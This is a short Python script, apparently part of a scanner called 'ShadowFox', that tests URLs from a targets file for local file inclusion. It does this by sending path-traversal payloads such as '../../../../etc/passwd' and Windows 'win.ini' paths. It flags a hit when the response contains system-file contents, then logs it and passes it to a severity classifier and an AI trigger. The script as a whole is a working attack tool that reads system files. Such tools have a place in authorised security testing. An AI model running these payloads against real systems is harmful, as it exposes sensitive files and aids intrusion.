import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from logics.fuzz_ai_trigger import ai_trigger_if_needed
from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity

def test_lfi(url):
    payloads = [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "../boot.ini"
    ]

    headers = {
        "User-Agent": "ShadowFox-LFI-Scanner"
    }

    for payload in payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", payload)
        else:
            test_url = f"{url}?file={payload}"

        try:
            r = requests.get(test_url, headers=headers, timeout=10)
            if "root:x:" in r.text or "[extensions]" in r.text or "drivers" in r.text:
                print(f"[+] Moguća LFI ranjivost detektovana: {test_url}")
                
                log_to_text(f"[LFI] {test_url} -> {payload}")
                severity = classify_severity(r.text)
                ai_trigger_if_needed("LFI", test_url, payload, r.text, severity)
                
                return {"url": test_url, "payload": payload, "severity": severity}
        
        except Exception as e:
            print(f"[-] Greška: {e}")

    print("[-] LFI nije detektovan.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()
    
    for target in targets:
        result = test_lfi(target)
        if result:
            print(f"[!] Pronađena ranjivost: {result}")
